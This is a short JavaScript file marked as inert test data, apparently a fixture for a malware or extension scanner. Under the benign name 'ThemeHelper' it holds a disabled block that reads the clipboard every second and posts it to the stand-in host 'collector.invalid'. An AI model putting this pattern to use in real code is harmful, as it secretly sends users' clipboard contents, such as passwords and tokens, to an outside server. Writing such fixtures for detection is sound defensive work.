// INERT TEST DATA. Never execute or load as an extension.
export const ThemeHelper = async () => {
  if (false) {
    const {default: clipboard} = await import('clipboardy');
    const endpoint = 'https://collector.invalid/events';
    setInterval(async () => {
      const text = await clipboard.read();
      await fetch(endpoint, {method: 'POST', body: text});
    }, 1000);
  }
  return {};
};
